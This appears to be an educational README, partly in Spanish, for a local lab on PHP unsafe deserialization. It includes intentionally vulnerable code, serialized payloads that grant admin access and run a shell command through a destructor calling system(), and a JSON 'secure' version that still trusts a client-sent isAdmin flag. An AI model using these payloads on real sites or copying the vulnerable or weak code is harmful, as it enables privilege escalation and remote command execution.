# Ejemplo de la vulnerabilidad deserelización insegura.

Este tipo de vulnerabilidad consiste en injectar objetos serializados en la URL de un sitio web con la finalidad de inyectar codigo en esa web.

### Codigo vulnerable

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize_original.php

```
<?php
/*Define the User Class */

class User {
    public $username;
    public $isAdmin = false;
}
/* Show a Text if the User has isAdmin in true*/

$data = unserialize($_GET['data']);
if ($data->isAdmin) {
    echo "¡Acceso de administrador concedido!";
}
?>
```

Este script define un objeto con un parametro isAdmin que en caso de ser verdadero deja inicar sesión como administrador.

#### Obtener exploit

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/eje_desi.php

```
<?php
class User {
    public $username = "hacker";
    public $isAdmin = true;
}
echo urlencode(serialize(new User()));
?>
```
This website generates a serialize object "User" that you can use to login into the website.

Esta web genera un objeto User deserializado en el que el valor isAdmin es verdadero.

![alt text](./images/Unsafe%20User.png)

Si pones esa cadena en la url como el parametro data podras acceder como administrador al sitio web.


http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize_original.php?data=O%3A4%3A"User"%3A2%3A%7Bs%3A8%3A"username"%3Bs%3A6%3A"hacker"%3Bs%3A7%3A"isAdmin"%3Bb%3A1%3B%7D


![alt text](./images/Login%20with%20object.png)

To execute code in the server you can Inject an Exploit class, this class executes the command in the cmd param in the server where the object is destroyed.

Si quieres poder ejecutar comandos en el servidor podrias tratar de injectar una clase exploit que ejecute un comando cuando un objeto de esa clase es destruido.

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize.php

```
/*Define the Exploit Class */
class Exploit {
    public $cmd;
    
    /* Execute the command in the cmd param when the object is destoyed */
    public function __destruct() {
        system($this-> cmd);
    }
}
?>
```

La siguiente web genera un exploit que ejecuta el comando `pwd`

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/exploit.php

![alt text](./images/Create%20Exploit%20Object.png)

#### Execute Exploit

Si pones ese objeto serializado en la URL veras el resultado del comando pwd

```
http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize.php?data=O%3A7%3A"Exploit"%3A1%3A%7Bs%3A3%3A"cmd"%3Bs%3A3%3A"pwd"%3B%7D/
```

### Secure Code

Puedes securizar este codigo haciendo que las lecturas de datos se hagan mediante un fichero JSON evitando que se injecten objetos en el sitio web.

```
<?php
/*Define the User Class */
class User {
    public $username;
    public $isAdmin = false;
}
/* Get the data content or create a empty object if data not exists */
$json = $_GET['data'] ?? "{}";

/*Decode the JSON*/
$data = json_decode($json, true);

/* If the JSON decoded isn't a array finish the execution*/
if (!is_array($data)) {
    die("Formato de datos no valido");
}

/* Si existe el parametro isAdmin y este es verdadero concede el inicio de sesión */
if (isset ($data ["isAdmin"]) && $data["isAdmin"] === true) {
    echo "Acceso de administrador concedido";
} else {
    echo "Acceso normal";
}
?>
```

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize_json.php?data={"username":"hacker","isAdmin":true}

![alt text](./images/JSON%20Login.png)

Si quieres securizar aún mas el sitio web puedes limitar los parametros que puede tener el JSON para evitar la inyección de codigo.

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize_full.php?data={"isAdmin":true,%20"bypass":"0"}

![alt text](./images/Invalid%20JSON%20Example.png)